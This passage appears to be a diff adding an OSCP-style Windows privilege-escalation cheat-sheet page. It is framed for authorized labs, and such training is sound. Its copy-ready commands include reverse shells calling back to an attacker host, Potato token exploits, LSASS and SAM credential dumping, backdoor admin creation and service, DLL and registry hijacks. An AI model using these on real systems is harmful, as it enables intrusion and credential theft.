+    <div class="toolbar">
+      <div class="search">
+        <span class="mag">⌕</span>
+        <input id="q" type="search" placeholder="Filter techniques & commands… (try: SeImpersonate, unquoted, SAM, UAC)" aria-label="Filter techniques">
+        <span class="clr" id="qclr">✕</span>
+      </div>
+      <button class="mini" id="expand">Expand all</button>
+      <button class="mini" id="collapse">Collapse</button>
+    </div>
+    <div class="progress-bar">
+      <div class="pb-track"><div class="pb-fill" id="pbfill"></div></div>
+      <div class="pb-label"><b id="pbcount">0</b>/10 vectors understood</div>
+    </div>
+    <div class="cards" id="cards"></div>
+    <div class="nohit" id="nohit">No technique matches that filter. Try a shorter keyword.</div>
+  </div>
+</section>
+
+<!-- ============ PRIVILEGE TABLE + POTATO MATRIX ============ -->
+<section id="privs">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">Read your token like a pro</span>
+      <h2>Privilege & Potato reference</h2>
+      <p>When <code>whoami /priv</code> shows one of these <em>Enabled</em>, you have a documented path. The second table picks the right Potato for the box's OS — the #1 thing beginners get wrong.</p>
+    </div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th class="mono">Privilege</th><th>What it really means</th><th>Escalation path</th></tr></thead>
+        <tbody>
+          <tr><td><span class="priv">SeImpersonate</span></td><td>Wear the token of anyone who connects to you.</td><td>Potato family → SYSTEM</td></tr>
+          <tr><td><span class="priv">SeAssignPrimaryToken</span></td><td>Hand a chosen token to a new process.</td><td>Potato variants / token swap</td></tr>
+          <tr><td><span class="priv">SeDebug</span></td><td>Open &amp; read any process's memory.</td><td>Dump LSASS · inject into SYSTEM</td></tr>
+          <tr><td><span class="priv">SeBackup</span></td><td>Read <em>any</em> file, DACL ignored.</td><td>Steal SAM / SYSTEM / NTDS.dit</td></tr>
+          <tr><td><span class="priv">SeRestore</span></td><td>Write <em>any</em> file, DACL ignored.</td><td>Overwrite a service binary / DLL</td></tr>
+          <tr><td><span class="priv">SeTakeOwnership</span></td><td>Seize ownership of any object.</td><td>Take a SYSTEM file, then edit it</td></tr>
+          <tr><td><span class="priv">SeLoadDriver</span></td><td>Load a kernel driver.</td><td>Load vulnerable driver → kernel</td></tr>
+          <tr><td><span class="priv">SeManageVolume</span></td><td>Low-level volume operations.</td><td>Arbitrary file write via volume</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <h3 style="font-family:var(--cond);font-size:21px;margin:30px 0 12px">Which Potato for which Windows?</h3>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th class="mono">Exploit</th><th>Win 7 / 2008</th><th>Win 10 1809- / 2016</th><th>Win 10 1903+ / 2019</th><th>Win 11 / 2022</th><th>Needs</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">JuicyPotato</td><td class="ynY">Yes</td><td class="ynY">Yes</td><td class="ynN">patched</td><td class="ynN">No</td><td>a valid CLSID</td></tr>
+          <tr><td class="mono">PrintSpoofer</td><td class="ynN">No</td><td class="ynY">Yes</td><td class="ynY">Yes</td><td class="ynY">Yes</td><td>Print Spooler running</td></tr>
+          <tr><td class="mono">GodPotato</td><td class="ynP">8+</td><td class="ynY">Yes</td><td class="ynY">Yes</td><td class="ynY">Yes</td><td>.NET installed</td></tr>
+          <tr><td class="mono">RoguePotato</td><td class="ynN">No</td><td class="ynN">No</td><td class="ynY">Yes</td><td class="ynY">Yes</td><td>port 135 redirect</td></tr>
+          <tr><td class="mono">SweetPotato</td><td class="ynP">partial</td><td class="ynY">Yes</td><td class="ynY">Yes</td><td class="ynY">Yes</td><td>auto-rotates</td></tr>
+          <tr><td class="mono">EfsPotato</td><td class="ynN">No</td><td class="ynY">Yes</td><td class="ynY">Yes</td><td class="ynY">Yes</td><td>EFS RPC service</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p style="font-size:13px;color:var(--text-faint);margin-top:10px;font-family:var(--mono)">Rule of thumb: <b>PrintSpoofer</b> if the Spooler runs, else <b>GodPotato</b> — between them they cover almost every modern box.</p>
+  </div>
+</section>
+
+<!-- ============ PAYLOAD COOKBOOK ============ -->
+<section id="payloads">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">msfvenom — allowed on every target</span>
+      <h2>Payload cookbook</h2>
+      <p>The exact payload format matters: a service wants <code>exe-service</code> (a plain exe dies instantly), DLL hijacks want <code>dll</code>, AlwaysInstallElevated wants <code>msi</code>. Use <code>shell_reverse_tcp</code> (not meterpreter) to stay clear of the Metasploit restriction.</p>
+    </div>
+    <div class="cols2">
+      <div>
+        <div class="col-h">Generate the payload</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">msfvenom.sh</span><button class="copy">copy</button></div>
+<pre><span class="cmt"># standard reverse shell exe</span>
+<span class="fn">msfvenom</span> -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f exe -o rev.exe
+<span class="cmt"># SERVICE exe — survives as a service</span>
+<span class="fn">msfvenom</span> ... -f exe-service -o svc.exe
+<span class="cmt"># DLL hijack</span>
+<span class="fn">msfvenom</span> ... -f dll -o evil.dll
+<span class="cmt"># AlwaysInstallElevated</span>
+<span class="fn">msfvenom</span> ... -f msi -o evil.msi</pre></div>
+      </div>
+      <div>
+        <div class="col-h">No payload needed — just add an admin</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">addadmin.cmd</span><button class="copy">copy</button></div>
+<pre><span class="cmt">:: run THIS as the command the vector executes</span>
+<span class="fn">net user</span> pwn P@ssw0rd123! /add
+<span class="fn">net localgroup</span> administrators pwn /add
+<span class="cmt">:: domain-joined? add to Domain Admins instead</span>
+<span class="fn">net localgroup</span> "Remote Desktop Users" pwn /add
+<span class="cmt">:: then: evil-winrm / rdp / psexec in as pwn</span></pre></div>
+      </div>
+    </div>
+    <p style="font-size:13px;color:var(--text-faint);margin-top:12px;font-family:var(--mono)">Often the cleanest privesc isn't a reverse shell at all — have the SYSTEM vector run <code>net user … /add</code>, then log back in as your new admin with <code>evil-winrm</code> or <code>psexec.py</code>.</p>
+  </div>
+</section>
+
+<!-- ============ PROOF & REPORTING ============ -->
+<section id="proof">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">The exam is passed here, not in the shell</span>
+      <h2>Capture proof before you touch anything else</h2>
+      <p>The moment <code>whoami</code> returns SYSTEM, stop and screenshot. A flag you can't evidence is a flag you didn't earn. Your screenshot must show the proof contents <em>and</em> your attacking IP in the same frame.</p>
+    </div>
+    <div class="cols2">
+      <div>
+        <div class="col-h">Run these, screenshot the output</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">proof.cmd</span><button class="copy">copy</button></div>
+<pre><span class="fn">whoami</span>                 <span class="cmt">:: must read nt authority\system</span>
+<span class="fn">hostname</span>
+<span class="fn">ipconfig</span> /all          <span class="cmt">:: show the target's IP</span>
+<span class="fn">type</span> C:\Users\Administrator\Desktop\proof.txt</pre></div>
+      </div>
+      <div>
+        <div class="col-h">Where the flags live</div>
+        <div class="panel" style="box-shadow:none">
+          <p style="font-family:var(--mono);font-size:13px;line-height:1.9;color:var(--text-dim)">
+          <b style="color:var(--text)">local.txt</b> — user flag<br>
+          <span style="color:var(--text-faint)">C:\Users\&lt;user&gt;\Desktop\local.txt</span><br><br>
+          <b style="color:var(--text)">proof.txt</b> — root/SYSTEM flag<br>
+          <span style="color:var(--text-faint)">C:\Users\Administrator\Desktop\proof.txt</span></p>
+        </div>
+        <p style="font-size:13px;color:var(--text-dim);margin-top:10px">Grab <code>local.txt</code> the instant you get the first shell — don't wait until after privesc, in case the box resets. Note <b>exact reproduction steps</b> as you go; you're writing the report from them.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ RABBIT HOLES ============ -->
+<section id="traps">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">Learn from others' wasted hours</span>
+      <h2>Traps that eat exam time</h2>
+      <p>These are the mistakes that cost points. Read them now so you recognise them at 2 a.m. during the exam.</p>
+    </div>
+    <div class="holes">
+      <div class="hole"><div class="h"><span class="sig">🕳️</span> Kernel exploit first</div><p><b>The trap:</b> you see an old build in <code>systeminfo</code> and immediately hunt a kernel exploit. <b>Why it hurts:</b> they're unreliable and can crash the box. Kernel exploits are a <b>last resort</b>, after every misconfig is ruled out.</p></div>
+      <div class="hole"><div class="h"><span class="sig">⏭️</span> Skimming winPEAS</div><p><b>The trap:</b> the scanner spat out 800 lines, so you scroll past. <b>Why it hurts:</b> the intended path is usually a <b>medium-severity</b> (yellow) finding, not a red one. Read it slowly; the box is telling you the answer.</p></div>
+      <div class="hole"><div class="h"><span class="sig">🔒</span> Forgetting it's a domain</div><p><b>The trap:</b> grinding local privesc on a domain-joined machine. <b>Why it hurts:</b> the path may be an <b>Active Directory</b> problem (Kerberoast, ACLs), not local. Check <code>ipconfig /all</code> early.</p></div>
+      <div class="hole"><div class="h"><span class="sig">🥔</span> Wrong Potato for the OS</div><p><b>The trap:</b> JuicyPotato "doesn't work," so you give up on tokens. <b>Why it hurts:</b> JuicyPotato is <b>patched on 2019+/Win11</b>. With SeImpersonate, switch to PrintSpoofer or GodPotato — the win is still there.</p></div>
+      <div class="hole"><div class="h"><span class="sig">💤</span> Plain exe for a service</div><p><b>The trap:</b> you point a service at a normal reverse-shell exe and it dies in seconds. <b>Why it hurts:</b> services expect to talk to the Service Control Manager. Use <code>-f exe-service</code>, or have it run <code>net user … /add</code>.</p></div>
+      <div class="hole"><div class="h"><span class="sig">📸</span> No proof screenshot</div><p><b>The trap:</b> you get SYSTEM, grab the flag, move on — then realise you never captured proof. <b>Why it hurts:</b> a point you can't evidence is a point you didn't earn. Screenshot <code>whoami</code> + flag + your IP <b>before</b> anything else.</p></div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap foot-grid">
+    <div>
+      <div class="scope"><span class="lk">▸</span><span>For authorized labs and the OSCP exam only — your own machines, a platform you pay for (PG / HTB / THM), or an engagement with written permission. Same techniques, one rule: get the scope in writing first.</span></div>
+      <p class="srcs">Grounded in the PEN-200 methodology · refs: <a href="https://book.hacktricks.wiki" target="_blank" rel="noopener">HackTricks</a>, <a href="https://swisskyrepo.github.io/InternalAllTheThings/" target="_blank" rel="noopener">Internal All The Things</a>, <a href="https://lolbas-project.github.io" target="_blank" rel="noopener">LOLBAS</a>, <a href="https://github.com/carlospolop/PEASS-ng" target="_blank" rel="noopener">PEASS-ng</a>.</p>
+    </div>
+    <p class="foot-note"><b>How to use this:</b> keep it open in a second monitor during practice. Land shell → run the Method loop → open the Map → search the technique → work the ways top-to-bottom. Come back before every box until the ladder is muscle memory. You've got this. 🪜</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var RM=window.matchMedia&&window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+
+  /* ---------- theme ---------- */
+  var root=document.documentElement,tbtn=document.getElementById("theme"),
+      tico=document.getElementById("theme-ico"),ttxt=document.getElementById("theme-txt");
+  function sysDark(){return window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;}
+  function curDark(){var t=root.getAttribute("data-theme");return t?t==="dark":sysDark();}
+  function paintToggle(){var d=curDark();tico.textContent=d?"☾":"☀";ttxt.textContent=d?"Dark":"Light";}
+  try{var sv=localStorage.getItem("cts-theme");if(sv)root.setAttribute("data-theme",sv);}catch(e){}
+  paintToggle();
+  tbtn.addEventListener("click",function(){var n=curDark()?"light":"dark";root.setAttribute("data-theme",n);try{localStorage.setItem("cts-theme",n);}catch(e){}paintToggle();});
+
+  /* ---------- ladder ---------- */
+  var rungs=[].slice.call(document.querySelectorAll("#rungs .rung"));
+  (document.querySelector('#rungs .rung[data-k="sys"]')||{}).classList&&document.querySelector('#rungs .rung[data-k="sys"]').classList.add("lit");
+  if(!RM){rungs.forEach(function(r,i){setTimeout(function(){r.classList.add("lit");setTimeout(function(){if(r.dataset.k!=="sys")r.classList.remove("lit");},520);},400+i*260);});}
+
+  /* ---------- methodology pulse ---------- */
+  var steps=[].slice.call(document.querySelectorAll(".loop-step"));
+  if(!RM&&steps.length){var si=0;setInterval(function(){steps.forEach(function(s){s.classList.remove("active");});steps[si].classList.add("active");si=(si+1)%steps.length;},1500);}
+
+  /* ---------- DATA: the ten vectors ---------- */
+  function T(name,code){return '<div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">'+name+'</span><button class="copy">copy</button></div><pre>'+code+'</pre></div>';}
+  var V=[
+  {id:"tokens",kind:"gold",short:"Token → Potatoes",title:"SeImpersonate → the Potato family",sub:"service accounts: IIS, MSSQL, web",prereq:"SeImpersonate",os:"Win7 – 2022",diff:"easy",
+   analogy:"A Windows token is a <b>hall pass</b> that says who you are. A service account with <b>SeImpersonatePrivilege</b> is the coat-check clerk: when someone hands over their coat (token), the clerk may put it on. The trick is making <b>SYSTEM</b> hand you its coat.",
+   why:"IIS / MSSQL service accounts hold SeImpersonate so they can act for connecting users. A \"Potato\" coaxes a SYSTEM process into authenticating to <b>you</b>, then you impersonate that SYSTEM token. This is the <b>single most common</b> Windows privesc on the exam.",
+   enum:[T("spot.cmd",'<span class="fn">whoami</span> <span class="fl">/priv</span>\n<span class="cmt">:: want SeImpersonatePrivilege or SeAssignPrimaryToken = Enabled</span>\n<span class="fn">whoami</span> <span class="fl">/groups</span>   <span class="cmt">:: service accts often in these groups</span>')],
+   ways:[
+    {label:"Way 1 — PrintSpoofer",tag:"Spooler",note:"Simplest on Win10/2016–2022 <b>if the Print Spooler runs</b>.",code:'<span class="fn">PrintSpoofer64.exe</span> <span class="fl">-i -c</span> cmd.exe\n<span class="fn">PrintSpoofer64.exe</span> <span class="fl">-c</span> <span class="str">"cmd /c net user pwn P@ss1! /add"</span>'},
+    {label:"Way 2 — GodPotato",tag:"broadest",note:"Works Win8–Server 2022, no Spooler needed. Needs .NET.",code:'<span class="fn">GodPotato.exe</span> <span class="fl">-cmd</span> <span class="str">"cmd /c whoami"</span>\n<span class="fn">GodPotato.exe</span> <span class="fl">-cmd</span> <span class="str">"cmd /c net localgroup administrators pwn /add"</span>'},
+    {label:"Way 3 — JuicyPotato",tag:"legacy",note:"Win7–2016 only (patched on 2019+). Needs a valid CLSID for the OS.",code:'<span class="fn">JuicyPotato.exe</span> <span class="fl">-l</span> 1337 <span class="fl">-p</span> c:\\windows\\system32\\cmd.exe <span class="fl">-a</span> <span class="str">"/c rev.exe"</span> <span class="fl">-t</span> * <span class="fl">-c</span> {CLSID}'},
+    {label:"Way 4 — RoguePotato / SweetPotato",tag:"fallback",note:"RoguePotato for 2019+ when you can redirect port 135; SweetPotato auto-rotates techniques.",code:'<span class="cmt">:: Kali:</span> socat tcp-listen:135,reuseaddr,fork tcp:TARGET:9999\n<span class="fn">RoguePotato.exe</span> <span class="fl">-r</span> KALI <span class="fl">-l</span> 9999 <span class="fl">-e</span> <span class="str">"cmd.exe /c rev.exe"</span>\n<span class="fn">SweetPotato.exe</span> <span class="fl">-e</span> EfsRpc <span class="fl">-p</span> cmd.exe'}],
+   oscp:"All Potato binaries are <b>allowed</b> — they're manual exploits, not Metasploit. Pick by OS (see the Potato table). If one fails, the privilege is still there: try the next.",
+   watch:"\"JuicyPotato doesn't work\" ≠ no token path. It's <b>patched on 2019+/Win11</b> — switch to PrintSpoofer or GodPotato. Always confirm <code>whoami /priv</code> first."},
+
+  {id:"mighty",kind:"gold",short:"Mighty privileges",title:"The other mighty privileges",sub:"SeBackup · SeRestore · SeDebug · SeTakeOwnership · SeLoadDriver",prereq:"a Se* right",os:"All",diff:"med",
+   analogy:"Some privileges are <b>master keys</b> that skip the lock entirely. SeBackup reads <em>any</em> file (even the password database). SeDebug reads any program's memory. SeTakeOwnership lets you seize any file and rewrite it. Each one is a direct route up.",
+   why:"These show up on hardened boxes where no service is misconfigured. Each maps to a specific, reliable technique — recognise the privilege in <code>whoami /priv</code> and you know the move.",
+   enum:[T("spot.cmd",'<span class="fn">whoami</span> <span class="fl">/priv</span>\n<span class="cmt">:: scan for SeBackup / SeRestore / SeDebug / SeTakeOwnership / SeLoadDriver = Enabled</span>')],
+   ways:[
+    {label:"SeBackup / SeRestore → steal the SAM",tag:"creds",note:"Read the password hives, crack or pass-the-hash the local admin offline.",code:'<span class="fn">reg save</span> hklm\\sam C:\\temp\\sam.hive\n<span class="fn">reg save</span> hklm\\system C:\\temp\\system.hive\n<span class="cmt">:: on Kali:</span>\n<span class="fn">impacket-secretsdump</span> -sam sam.hive -system system.hive LOCAL'},
+    {label:"SeDebug → dump LSASS (no tools)",tag:"creds",note:"Dump live credentials with a built-in DLL, then parse offline.",code:'<span class="cmt">:: get lsass PID, then minidump it</span>\n<span class="fn">tasklist</span> /fi "imagename eq lsass.exe"\n<span class="fn">rundll32</span> C:\\Windows\\System32\\comsvcs.dll, MiniDump &lt;PID&gt; C:\\temp\\lsass.dmp full\n<span class="cmt">:: on Kali: pypykatz lsa minidump lsass.dmp</span>'},
+    {label:"SeTakeOwnership → own a SYSTEM file",tag:"swap",note:"Take a file a SYSTEM service/task runs, grant yourself write, replace it.",code:'<span class="fn">takeown</span> /f <span class="str">"C:\\path\\to\\service.exe"</span>\n<span class="fn">icacls</span> <span class="str">"C:\\path\\to\\service.exe"</span> /grant %USERNAME%:F\n<span class="cmt">:: now overwrite it with your payload, trigger it</span>'},
+    {label:"SeLoadDriver → kernel",tag:"advanced",note:"Load a known-vulnerable signed driver (Capcom.sys) and exploit it. Last resort.",code:'<span class="fn">EoPLoadDriver.exe</span> System\\CurrentControlSet\\MyDrv C:\\temp\\Capcom.sys\n<span class="fn">ExploitCapcom.exe</span> cmd.exe'}],
+   oscp:"<b>reg save</b>, <b>takeown</b>, <b>icacls</b>, <b>rundll32/comsvcs</b> are all native. <code>impacket-secretsdump</code> and <code>pypykatz</code> run on Kali — fully allowed. SeBackup → SAM is a classic PG box ending.",
+   watch:"For LSASS dumping you usually need to already be <b>high integrity</b> (admin) or hold SeDebug — a plain low-priv user can't open LSASS. Check the privilege is actually <b>Enabled</b>, not just present."},
+
+  {id:"service",kind:"cyan",short:"Service misconfig",title:"Service Misconfigurations",sub:"unquoted path · weak perms · writable binary · writable registry",prereq:"writable service",os:"All",diff:"easy",
+   analogy:"A Windows <b>service</b> is a program that starts itself, usually as SYSTEM. If you can change <b>what it runs</b> — its config, its .exe, or its registry entry — SYSTEM runs your code at the next restart.",
+   why:"Four flavours, all ending the same way. An <b>unquoted path</b> with a space (Windows runs an earlier file); <b>weak permissions</b> (you rewrite the config); a <b>writable binary</b> (overwrite the .exe); or a <b>writable service registry key</b> (repoint ImagePath).",
+   enum:[T("find.cmd",'<span class="cmt">:: unquoted paths with spaces (not in Windows dir)</span>\n<span class="fn">wmic</span> service get name,pathname,startmode | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """\n<span class="cmt">:: what can my user change? (Sysinternals)</span>\n<span class="fn">accesschk</span> <span class="fl">-uwcqv</span> %USERNAME% * /accepteula\n<span class="cmt">:: inspect one service / its binary ACL</span>\n<span class="fn">sc</span> qc &lt;svc&gt;    &amp;    <span class="fn">icacls</span> <span class="str">"C:\\Program Files\\VulnApp\\service.exe"</span>')],
+   ways:[
+    {label:"Way 1 — Weak perms: reconfigure binpath",tag:"SERVICE_CHANGE_CONFIG",note:"You can rewrite the service config → point it at your payload.",code:'<span class="fn">sc</span> config vulnsvc binpath= <span class="str">"C:\\temp\\svc.exe"</span>\n<span class="fn">sc</span> stop vulnsvc  &amp;  <span class="fn">sc</span> start vulnsvc\n<span class="cmt">:: can\'t restart? check: sc qc vulnsvc → START_TYPE, or reboot-triggered</span>'},
+    {label:"Way 2 — Writable binary: replace the .exe",tag:"(F)/(M)/(W)",note:"icacls shows you can write the service exe → swap it, restart.",code:'<span class="fn">copy</span> /y C:\\temp\\svc.exe <span class="str">"C:\\Program Files\\VulnApp\\service.exe"</span>\n<span class="fn">sc</span> stop vulnsvc  &amp;  <span class="fn">sc</span> start vulnsvc'},
+    {label:"Way 3 — Unquoted path: plant a binary",tag:"needs writable dir",note:'C:\\Program Files\\My App\\svc.exe is tried as C:\\Program.exe, then C:\\Program Files\\My.exe …',code:'<span class="cmt">:: if you can write C:\\ or "C:\\Program Files\\":</span>\n<span class="fn">copy</span> svc.exe <span class="str">"C:\\Program Files\\My.exe"</span>\n<span class="fn">sc</span> start vulnsvc'},
+    {label:"Way 4 — PowerUp does it for you",tag:"automate",note:"Finds and weaponises all of the above.",code:'<span class="fn">Import-Module</span> .\\PowerUp.ps1\n<span class="fn">Get-ModifiableService</span> ; <span class="fn">Get-ServiceUnquoted</span>\n<span class="fn">Invoke-ServiceAbuse</span> -Name vulnsvc -Command "net user pwn P@ss1! /add"'}],
+   oscp:"PowerUp is enumeration-adjacent and allowed. Use <code>-f exe-service</code> for the payload so the service doesn't die on start. Always confirm you can actually <b>restart</b> the service (or that it restarts at boot).",
+   watch:"Not every unquoted service is exploitable — you need <b>write access to an earlier folder</b> in the path. Check each folder with <code>icacls</code> before you get excited."},
+
+  {id:"dll",kind:"cyan",short:"DLL hijacking",title:"DLL Hijacking",sub:"phantom DLLs · writable %PATH%",prereq:"writable search dir",os:"All",diff:"med",
+   analogy:"When a program needs a helper library (a <b>.dll</b>) it asks <b>by name</b> and grabs the first match it finds — like asking for \"a book called <em>utils</em>\" and taking the first off the nearest shelf. Put <b>your</b> book on a shelf it checks first, and it reads yours.",
+   why:"Windows searches folders in a fixed order: the app's own folder, System32, …, then <code>%PATH%</code>. If a privileged app looks for a DLL that <b>isn't there</b> (a phantom DLL), or you can write to a folder it checks early, you drop a malicious DLL that loads as that app's user.",
+   enum:[T("find.cmd",'<span class="cmt">:: writable dirs in PATH (great DLL-plant spots)</span>\n<span class="fn">accesschk</span> <span class="fl">-uwdqs</span> Users %PATH:;=\n%\n<span class="cmt">:: find missing DLLs with Process Monitor (procmon):</span>\n<span class="cmt">::   filter Result = NAME NOT FOUND, Path ends .dll</span>')],
+   ways:[
+    {label:"Way 1 — Build & plant the DLL",tag:"core",note:"Compile a payload DLL and drop it where the app looks before the real one.",code:'<span class="fn">msfvenom</span> -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f dll -o evil.dll\n<span class="cmt">:: copy to the phantom path / writable PATH dir, then trigger the app</span>\n<span class="fn">copy</span> evil.dll <span class="str">"C:\\writable\\on\\path\\missing.dll"</span>'},
+    {label:"Way 2 — PowerUp hijack check",tag:"automate",note:"Flags writable %PATH% dirs you can abuse.",code:'<span class="fn">Import-Module</span> .\\PowerUp.ps1\n<span class="fn">Find-PathDLLHijack</span>'}],
+   oscp:"msfvenom DLL is allowed. Procmon needs a GUI/admin to see system processes, so on a plain shell you often rely on <b>known phantom DLLs</b> or writable-%PATH% findings from winPEAS/PowerUp instead.",
+   watch:"You still need a <b>writable folder the app searches</b> AND the app must restart/re-run. Prove the missing DLL (procmon) rather than guessing — don't sink an hour hijacking a DLL that already exists."},
+
+  {id:"tasks",kind:"cyan",short:"Scheduled tasks",title:"Scheduled Task Abuse",sub:"SYSTEM task runs a file you control",prereq:"writable task target",os:"All",diff:"med",
+   analogy:"A scheduled task is an <b>alarm clock</b> that runs a program on a timer or at logon — often as SYSTEM. If you can edit the program it points at (or drop a file where it expects one), SYSTEM runs your code when the alarm fires.",
+   why:"Admins schedule scripts to run as a privileged user. If that script or binary sits in a folder <b>you can write to</b>, replace it; if it points at a path that doesn't exist yet, create it there. Then wait for the trigger.",
+   enum:[T("find.cmd",'<span class="fn">schtasks</span> <span class="fl">/query</span> /fo LIST /v | findstr /i "TaskName Run:As Task To Run Schedule"\n<span class="cmt">:: PowerShell</span>\n<span class="fn">Get-ScheduledTask</span> | ? State -ne Disabled\n<span class="cmt">:: can I write the target?</span>\n<span class="fn">icacls</span> <span class="str">"C:\\Scripts\\backup.bat"</span>')],
+   ways:[
+    {label:"Way 1 — Overwrite the target",tag:"writable file",note:"Task runs a script/exe you can write → replace its contents.",code:'<span class="fn">echo</span> C:\\temp\\rev.exe &gt; <span class="str">"C:\\Scripts\\backup.bat"</span>\n<span class="cmt">:: then wait for the scheduled run (note the trigger time)</span>'},
+    {label:"Way 2 — Plant a missing target",tag:"phantom",note:"Task points at a path that doesn't exist yet and you can create it.",code:'<span class="fn">copy</span> rev.exe <span class="str">"C:\\Scripts\\missing_task.exe"</span>'}],
+   oscp:"Pure built-ins. Note the <b>schedule</b> so you know when to expect your shell — some tasks only fire at logon or on a long timer.",
+   watch:"Don't assume the task fired — <b>confirm</b> your shell/admin appeared before moving on. If it's logon-triggered and nobody logs in, it won't run during your session."},
+
+  {id:"registry",kind:"cyan",short:"Registry autoruns",title:"Registry Autoruns & Startup",sub:"writable Run key / autorun binary",prereq:"writable Run entry",os:"All",diff:"med",
+   analogy:"The registry's <b>Run</b> keys are the list of programs Windows launches at logon — the startup drawer. If you can edit an entry, or overwrite a program it launches, your code runs the next time a higher-privileged user logs in.",
+   why:"Autorun entries under <code>HKLM\\…\\Run</code> execute at boot/logon in that user's context. Writable target binary? Replace it. Writable key itself? Add your own. Persistence and privesc in one.",
+   enum:[T("find.cmd",'<span class="fn">reg query</span> HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n<span class="fn">reg query</span> HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n<span class="cmt">:: is the key or its target binary writable?</span>\n<span class="fn">accesschk</span> <span class="fl">-wvu</span> <span class="str">"HKLM\\...\\CurrentVersion\\Run"</span> /accepteula')],
+   ways:[
+    {label:"Way 1 — Writable key: add an entry",tag:"HKLM",note:"HKLM Run fires for any user (incl. admins) at logon.",code:'<span class="fn">reg add</span> HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d C:\\temp\\rev.exe /f'},
+    {label:"Way 2 — Writable target: replace it",tag:"swap",note:"An existing autorun points at a binary you can overwrite.",code:'<span class="fn">copy</span> /y rev.exe <span class="str">"C:\\path\\autorun_app.exe"</span>'}],
+   oscp:"Native commands, nothing restricted. Winlogon <code>Userinit</code>/<code>Shell</code> keys are variants worth checking too.",
+   watch:"Fires on the <b>next logon</b> of the target user — great for HKLM, less useful if only your own HKCU is writable (that only elevates to… you)."},
+
+  {id:"aie",kind:"cyan",short:"AlwaysInstallElevated",title:"AlwaysInstallElevated",sub:"policy lets any MSI run as SYSTEM",prereq:"2 reg keys = 1",os:"All",diff:"easy",
+   analogy:"A company policy that says: <b>\"any installer runs with admin rights, no questions asked.\"</b> If an admin turned it on, you just hand Windows an installer <b>you</b> built.",
+   why:"When both a per-user and per-machine key are set to 1, Windows installs <b>any</b> .msi with SYSTEM privileges. Generate a malicious MSI and run it — no other misconfig needed.",
+   enum:[T("spot.cmd",'<span class="cmt">:: BOTH must return 0x1</span>\n<span class="fn">reg query</span> HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n<span class="fn">reg query</span> HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated')],
+   ways:[
+    {label:"Way 1 — msfvenom MSI",tag:"core",note:"Build and silently install the payload.",code:'<span class="fn">msfvenom</span> -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f msi -o evil.msi\n<span class="fn">msiexec</span> /quiet /qn /i evil.msi'},
+    {label:"Way 2 — PowerUp one-liner",tag:"automate",note:"Builds an MSI that adds a local admin for you.",code:'<span class="fn">Import-Module</span> .\\PowerUp.ps1\n<span class="fn">Write-UserAddMSI</span>   <span class="cmt">:: run the generated .msi</span>'}],
+   oscp:"msfvenom MSI and PowerUp are allowed. A 10-second check — include it in every first-pass recon; winPEAS flags it automatically.",
+   watch:"<b>Both</b> keys must be 1 — one alone does nothing."},
+
+  {id:"creds",kind:"red",short:"Stored credentials",title:"Stored Credentials & Secrets",sub:"passwords left lying around",prereq:"none — just look",os:"All",diff:"easy",
+   analogy:"People leave keys under the mat. On Windows that means passwords in <b>config files, saved logins, install scripts and the registry</b>. Found creds beat any exploit — and you should try them <b>everywhere</b>.",
+   why:"Admins leave secrets behind: setup files, connection strings, saved RDP creds, autologon passwords, PowerShell history, the Credential Manager vault, and app configs (PuTTY/WinSCP/VNC). Recovered creds may be a local admin or a domain account — reuse them broadly.",
+   enum:[T("hunt.cmd",'<span class="fn">cmdkey</span> <span class="fl">/list</span>                 <span class="cmt">:: saved credentials</span>\n<span class="fn">reg query</span> <span class="str">"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"</span>  <span class="cmt">:: autologon</span>\n<span class="fn">dir</span> /s /b C:\\*unattend.xml C:\\*sysprep.inf C:\\*web.config 2&gt;nul\n<span class="fn">type</span> %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n<span class="fn">vaultcmd</span> /listcreds:"Windows Credentials" /all\n<span class="cmt">:: SAM backups</span>\n<span class="fn">dir</span> C:\\Windows\\Repair\\ C:\\Windows\\System32\\config\\RegBack\\')],
+   ways:[
+    {label:"Way 1 — Run as the saved account",tag:"runas",note:"cmdkey showed a stored cred → use it without knowing the password.",code:'<span class="fn">runas</span> /savecred /user:admin <span class="str">"cmd /c C:\\temp\\rev.exe"</span>'},
+    {label:"Way 2 — App config secrets",tag:"loot",note:"PuTTY/WinSCP/VNC/mRemoteNG store creds in registry or ini.",code:'<span class="fn">reg query</span> "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s\n<span class="cmt">:: WinSCP.ini, VNC password in registry, mRemoteNG confCons.xml</span>'},
